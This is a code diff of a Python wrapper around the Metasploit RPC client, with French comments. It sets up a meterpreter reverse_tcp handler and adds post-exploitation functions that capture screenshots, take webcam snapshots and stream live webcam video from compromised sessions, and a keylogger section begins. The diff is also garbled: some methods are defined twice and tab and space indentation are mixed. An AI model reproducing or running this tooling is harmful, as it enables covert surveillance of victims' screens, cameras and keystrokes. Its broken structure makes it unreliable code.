@@ -16,8 +16,8 @@ from Shell import Shell
 
 class MsfToolbox:
     """
-Metasploit RPC listens locally to the port by default (55553)
-msfrpcd -P mypassword -n -f -a 127.0.0.1
+    Metasploit RPC listens locally to the port by default (55553)
+    msfrpcd -P mypassword -n -f -a 127.0.0.1
     # os.system("msfrpcd -P " + mypassword + " -n -f -a 127.0.0.1")
 
     Paradigme de delegation pour les differents modules qui correspondent a des fonctionnalites
@@ -28,17 +28,23 @@ msfrpcd -P mypassword -n -f -a 127.0.0.1
         self._password = password
         self.init_client()
 
-        # self._ip = get_ip_address('eth0') On docker it's easier to put in by hand
-        #self._ip = '172.17.0.3'
-    #self._ip = '192.168.4.1'
-        self._ip = '172.21.42.1'
+		self._ip = '192.168.4.1'
+		#self._ip = '172.21.42.1'
 
-        # Remove old medias
-        media.remove_medias()
+		# Remove old medias
+		media.remove_medias()
+
+		# Init remote to false
+		self.disable_remote()
+
+		# Live stream if off at the beginning
+		self._streaming = False
+
 
     def init_client(self):
         self._client = MsfRpcClient(self._password, port=self._port)
         self._console = self._client.consoles.console()
+
 
     def exploit_multi_handler(self, lport=4444, payload='windows/x64/meterpreter/reverse_tcp'):
         exploit = self._client.modules.use('exploit', 'multi/handler')
@@ -138,7 +144,39 @@ msfrpcd -P mypassword -n -f -a 127.0.0.1
     def get_screenshots_url(self, session):
         return media.get_medias_url(session, "screenshots")
 
-    # Information
+		# Take screenshot
+		screenshot.post_take_screenshot(self._client, session, screenshot_path, count, delay, record, view_screenshots)
+
+		# Wait the end of the function (migration or execution of screenshot)
+		while not os.path.exists(screenshot_path):
+			time.sleep(0.1)
+
+
+	def get_screenshots_url(self, session):
+		return media.get_medias_url(session, "screenshots")
+
+
+	# Information
+	def get_sysinfo(self, session):
+		return information.get_sysinfo(self.get_session_shell(session))
+
+
+	# Webcam snapshots
+	def has_webcam(self, session):
+		shell = self.get_session_shell(session)
+		webcam.has_webcam(shell)
+
+	def post_take_snapshot(self, session):
+		shell = self.get_session_shell(session)
+		snapshot_path = media.get_media_path(session, "snapshots")
+
+		# Take snapshot
+		webcam.post_take_snapshot(shell, snapshot_path)
+
+
+	def get_snapshots_url(self, session):
+		return media.get_medias_url(session, "snapshots")
+
 
     def get_sysinfo(self, session_id):
         shell = self.get_session_shell(session_id)
@@ -151,32 +189,41 @@ msfrpcd -P mypassword -n -f -a 127.0.0.1
 	# Live
 	def start_live(self, session):
 		media.remove_live_path()
+		shell = self.get_session_shell(session)
+		live_path = media.get_live_path()
+		webcam.start_live(shell, live_path)
+		self.enable_streaming_flag()
 
-    def post_take_snapshot(self, session):
-        shell = self.get_session_shell(session)
-        snapshot_path = media.get_media_path(session, "snapshots")
 
-        # Take snapshot
-        webcam.post_take_snapshot(shell, snapshot_path)
+	def stop_live(self, session):
+		shell = self.get_session_shell(session)
+		webcam.stop_live(shell)
+		self.disable_streaming_flag()
+		media.remove_live_path()
 
-    def get_snapshots_url(self, session):
-        return media.get_medias_url(session, "snapshots")
-
-    # Live
-
-    def start_live(self, session):
-        return
-
-    def stop_live(self, session):
-        media.remove_live_path()
 
     def live_update_frame(self, session):
-        shell = self.get_session_shell(session)
-        live_path = media.get_live_path()
-        webcam.post_take_snapshot(shell, live_path)
+		#shell = self.get_session_shell(session)
+		#live_path = media.get_live_path()
+		#webcam.post_take_snapshot(shell, live_path)
+		pass
+
 
     def get_live_url(self):
         return media.get_live_url()
+
+
+	def enable_streaming_flag(self):
+		self._streaming = True
+
+
+	def disable_streaming_flag(self):
+		self._streaming = False
+
+
+	def get_streaming_flag(self):
+		return self._streaming
+
 
     # Keylogger
 
